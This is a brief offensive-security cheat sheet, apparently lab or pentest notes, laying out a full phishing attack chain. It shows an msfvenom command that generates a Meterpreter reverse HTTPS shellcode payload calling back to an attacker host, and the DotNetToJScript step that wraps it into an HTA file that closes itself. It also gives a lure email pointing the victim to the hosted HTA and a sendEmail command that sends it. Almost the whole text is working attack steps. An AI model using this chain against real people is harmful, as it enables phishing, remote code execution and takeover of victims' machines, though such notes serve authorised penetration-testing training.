> Generate shellcode:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.x.x LPORT=443 -f csharp
```

> Compile in DotNetToJscript ExampleAssembly.dll project then create runner.js:

```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```

> Take runner.js output from notepad and add within the hta script tags:

```
<html>
<head>
<script language="JScript">
<code start>

<code end>
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

> Host up email.hta on your python server. Now create email.txt with the following message body:

```
Dear <user>,

Please review this important document:
http://192.168.x.x/email.hta

Have a lovely day.
```

> Now we start our listener and then send the phishing email:

```
sendEmail -s <target_ip> -t <target_email> -f <kali_email> -u "<subject>" -o message-file=./email.txt  
```
